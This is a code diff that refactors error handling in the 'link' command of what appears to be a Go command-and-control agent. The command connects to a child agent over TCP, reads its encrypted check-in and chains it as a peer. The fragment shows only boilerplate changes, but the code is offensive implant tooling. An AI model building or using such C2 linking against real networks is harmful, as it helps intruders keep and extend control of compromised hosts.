@@ -45,50 +45,30 @@ func (c *LinkCommand) Execute(task structs.Task) structs.CommandResult {
 	var args linkArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to parse parameters: %v", err)
 		}
 	}
 
 	if args.Host == "" || args.Port == 0 {
-		return structs.CommandResult{
-			Output:    "Both host and port are required (e.g., {\"host\": \"10.0.0.2\", \"port\": 7777})",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Both host and port are required (e.g., {\"host\": \"10.0.0.2\", \"port\": 7777})")
 	}
 
 	if tcpProfileInstance == nil {
-		return structs.CommandResult{
-			Output:    "TCP P2P not available — agent was not built with TCP profile support",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("TCP P2P not available — agent was not built with TCP profile support")
 	}
 
 	// Connect to the child agent's TCP listener
 	addr := net.JoinHostPort(args.Host, fmt.Sprintf("%d", args.Port))
 	conn, err := net.DialTimeout("tcp", addr, 15*time.Second)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to connect to %s: %v", addr, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to connect to %s: %v", addr, err)
 	}
 
 	// Read the child's initial checkin message (length-prefixed)
 	data, err := recvTCPFramed(conn)
 	if err != nil {
 		conn.Close()
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to read child checkin from %s: %v", addr, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to read child checkin from %s: %v", addr, err)
 	}
 
 	// The child sends base64(UUID + encrypted_body).
@@ -96,11 +76,7 @@ func (c *LinkCommand) Execute(task structs.Task) structs.CommandResult {
 	decoded, err := base64.StdEncoding.DecodeString(string(data))
 	if err != nil || len(decoded) < 36 {
 		conn.Close()
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Invalid checkin data from %s", addr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Invalid checkin data from %s", addr)
 	}
 	childUUID := string(decoded[:36])
 
@@ -122,11 +98,7 @@ func (c *LinkCommand) Execute(task structs.Task) structs.CommandResult {
 		C2ProfileName: "tcp",
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Successfully linked to %s (child UUID: %s)", addr, childUUID[:8]),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Successfully linked to %s (child UUID: %s)", addr, childUUID[:8])
 }
 
 // recvTCPFramed reads a length-prefixed TCP message (4-byte big-endian length + payload).
